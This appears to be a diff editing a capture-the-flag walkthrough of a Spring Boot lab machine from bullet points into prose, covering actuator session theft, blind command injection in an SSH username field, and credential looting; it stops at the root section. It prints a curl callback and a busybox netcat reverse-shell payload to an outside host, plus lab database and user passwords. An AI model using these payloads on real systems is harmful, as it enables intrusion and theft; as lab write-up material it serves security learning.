@@ -29,26 +29,17 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Tue Sep 29 04:42:09 2026 -- 1 IP address (1 host up) scanned in 45.80 seconds
 ```
 
-- There's an **/admin** page
-- Got a **500 status code** while discovering directories -> `/error`
-
-- **Whitelabel Error Page** -> A **whitelabel error** page is a generic, unbranded error page displayed by a web application or framework (commonly in **Spring Boot**) when something goes wrong and no custom error handler is configured.
-
-We get to know it's made by the **Spring Boot framework** — test it using a **springboot wordlist** to find related **endpoints**:
+Directory discovery turns up an **/admin** page, plus a **500 status code** on `/error`. That error page is a **Whitelabel Error Page** — a generic, unbranded page displayed by a web application or framework (commonly in **Spring Boot**) when something goes wrong and no custom error handler is configured. It confirms the app runs on the **Spring Boot framework**, so it's worth testing with a **springboot wordlist** for related **endpoints**:
 
 ```wordlist
 /usr/share/wordlists/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
 ```
 
-Found an endpoint **/actuator** -> reveals an interesting subdirectory `/sessions`
-
-- Gained the session of a user **kanderson** -> using cookie editor
+An endpoint **/actuator** stands out and reveals an interesting subdirectory, `/sessions`. Gained the session of a user **kanderson** using a cookie editor.
 
 # User
 
-There are two input fields which execute an ssh command with a key:
-- Hostname
-- Username
+There are two input fields which execute an ssh command with a key: **Hostname** and **Username**. Behind the scenes it runs:
 
 ---
 **Background process** :
@@ -57,18 +48,17 @@ ssh -i id_rsa username@hostname
 ```
 ---
 
-Hostname needs to be valid -> `127.0.0.1` can be used.
+The hostname needs to be valid — `127.0.0.1` can be used.
 
-The **hostname** seems to be a **strict field**, can't be abused — so move to the **username field**:
-- We can set up a server or try time delay commands like `sleep 5`, because output looks like **blind command injection**
-- it also won't accept spacing between letters => solution: `${IFS}`
+The **hostname** field is strict and can't be abused, so the attack moves to the **username field**. The output looks like **blind command injection**, which we can confirm by pointing it at our own server or trying time-delay commands like `sleep 5`. Spacing between letters is rejected too, so the fix is `${IFS}`:
 
 > **Note**: `${IFS}` is a bash variable that contains the Internal Field Separator (default: space, tab, newline) used to split words and fields in shell scripts.
 
 ```username-field
 dante;curl${IFS}http://10.10.16.82:8000/y;
 ```
-- We got a response on our python server
+
+A response lands on our python server.
 
 Shell time:
 
@@ -78,7 +68,7 @@ dante;busybox${IFS}nc${IFS}10.10.16.82${IFS}9001${IFS}-e${IFS}/bin/bash;
 
 Gained shell as user **app**
 
-In the `/app` directory where we got our shell there's a `.jar` file which is the **web application**:
+In the `/app` directory where we got our shell sits a `.jar` file — the **web application** itself:
 
 ```sh
 unzip cloudhosting-0.0.1.jar
@@ -110,7 +100,7 @@ cloudhosting-0.0.1
 ...<SNIP>...
 ```
 
-**application.properties** -> **configuration settings** for a web application, typically stored in a configuration file that controls how the application behaves without changing code (**In Spring Boot**):
+**application.properties** holds the **configuration settings** for a web application — a configuration file that controls how the application behaves without changing code (**In Spring Boot**):
 
 ```application-properties
 server.address=127.0.0.1
@@ -127,7 +117,7 @@ spring.datasource.username=postgres
 spring.datasource.password=Vg&nvzAQ7XxR
 ```
 
-Gained creds of the **postgres** **username** and **password**:
+These give the **postgres** **username** and **password**:
 
 > `postgres - Vg&nvzAQ7XxR`
 
@@ -147,13 +137,11 @@ psql -h 127.0.0.1 -U postgres -W
 select * from users;
 ```
 
-- Decrypt the password using hashcat
-
-We know there's a user named josh — josh might be the one who created the service (admin):
+The password hash decrypts using hashcat. There's a user named josh — josh might be the one who created the service (admin):
 
 > `josh - manchesterunited`
 
-Gained shell as user **josh**
+Gained a shell as user **josh**
 
 # Root 
 
